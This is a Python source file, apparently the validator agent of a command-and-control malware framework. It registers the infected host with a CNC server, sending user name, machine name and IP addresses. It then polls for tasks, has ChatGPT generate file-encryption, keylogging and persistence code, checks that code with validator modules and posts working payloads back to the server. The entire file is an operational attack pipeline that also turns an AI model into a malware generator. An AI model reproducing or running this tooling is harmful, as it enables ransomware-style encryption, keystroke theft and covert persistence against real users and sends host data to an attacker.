import json
import os
import platform
import socket
import time
from enum import Enum
import requests

from ChatGPT.ChatGPT import ChatGPT
from Utilities.IpUtilities import get_ip_tuple

# Validators
import Validators.encrypt
import Validators.keylogging
import Validators.persistence

# Constants
CNC_DOMAIN = "192.168.20.1:5000" # TODO: Change this to your CNC IP / Domain
UPDATE_TEST_COMMAND_API_ENDPOINT = "/api/set_command_test_status"
PULL_TEST_COMMAND_API_ENDPOINT = "/api/pull_test_commands_requests"


class CommandEnum(Enum):
    ENCRYPT_FILE = 1
    KEY_LOGGING = 2
    SET_PERSISTENCE = 3


def is_validator_registered():
    return os.path.exists("jwt.bin")


def load_jwt():
    jwt = None
    with open("jwt.bin", "r") as fi:
        jwt = json.load(fi)
    return jwt


def register_validator_agent():

    os_type = platform.system()

    if platform.system() == "Windows":
        machine_name = os.environ['COMPUTERNAME']
        user_name = os.environ['USERNAME']
    else:
        machine_name = socket.gethostname()
        user_name = os.environ['USER']

    pretty_name = f"{user_name}_{machine_name}_validator_{os_type}"

    response = requests.post(f"http://{CNC_DOMAIN}/api/validatorregister",
                  headers={'Content-Type': 'application/json'},
                  data=json.dumps({
                      "os_type": platform.system(),
                      "local_ip": get_ip_tuple()[0],
                      "public_ip": get_ip_tuple()[1],
                      "pretty_name": pretty_name,
                  })
                  )
    if response.status_code == 200:
        with open("jwt.bin", "w") as fi:
            fi.write(json.dumps(response.json()))
    else:
        raise Exception("Bad response for registerValidator")


def pull_commands(jwt):
    response = requests.post(f"http://{CNC_DOMAIN}{PULL_TEST_COMMAND_API_ENDPOINT}",
                             headers={
                                 'Content-Type': 'application/json',
                                 'Authorization': f'bearer {jwt}',

                                }
                             )
    if response.status_code == 200:
        return response.json()
    else:
        return None


def get_new_jwt_token(uuid, password):
    response = requests.post(f"http://{CNC_DOMAIN}/api/getpermanentjwt",
                             headers={'Content-Type': 'application/json'},
                             data=json.dumps({"agent_id": uuid, "password": password})
                             )
    if response.status_code == 200:
        return response.json()["token"]
    else:
        return None


VALIDATORS_DICT = {
    CommandEnum.KEY_LOGGING.value: (Validators.keylogging.check_key_logging_func, Validators.keylogging.KEY_LOGGING_QUERY),
    CommandEnum.ENCRYPT_FILE.value: (Validators.encrypt.check_encryption_func, Validators.encrypt.ENCRYPT_QUERY),
    CommandEnum.SET_PERSISTENCE.value: (Validators.persistence.check_persistence, Validators.persistence.PERSISTENCE_QUERY),
}


def main():
    if not is_validator_registered():
        register_validator_agent()
    jwt_object = load_jwt()

    openai = ChatGPT()

    while True:
        print(f"[+] Going to sleep for 5 seconds")
        time.sleep(5)
        print(f"[+] Pulling commands")
        commands_object = pull_commands(jwt_object["jwt"])
        print(f"[+] Pulled command_object => {commands_object}")

        if commands_object is not None and\
                "commands_test_count" in commands_object and\
                commands_object["commands_test_count"] > 0 and\
                len(commands_object["commands_list"]) > 0:
            for command_object in commands_object["commands_list"]:
                print(f"command_object => {command_object}")
                if command_object["commandType"] in VALIDATORS_DICT.keys():
                    func_to_run, query = VALIDATORS_DICT[command_object["commandType"]]
                    res, code = openai.query_and_check(query, func_to_run)

                    if res is True:
                        print(f"[+] Found a working code that passed the tests")
                        print(f"code: {code}")
                    else:
                        print(f"[-] Failed to find a working code...")

                    resp = requests.post(f"http://{CNC_DOMAIN}{UPDATE_TEST_COMMAND_API_ENDPOINT}",
                      headers={'Content-Type': 'application/json',
                               'Authorization': f'bearer {jwt_object["jwt"]}'},
                      data=json.dumps({
                          "command_test_request_id": command_object["commandTestId"],
                          "command_test_request_payload": ("" if code is None else code),
                          "command_request_is_passed_test": res,
                      })
                     )

                    if resp.status_code == 200:
                        print("[+] Updated the test command status successfully")
                    else:
                        print("[-] Something went wrong while trying to update the status of the test command")


if '__main__' == __name__:
    main()
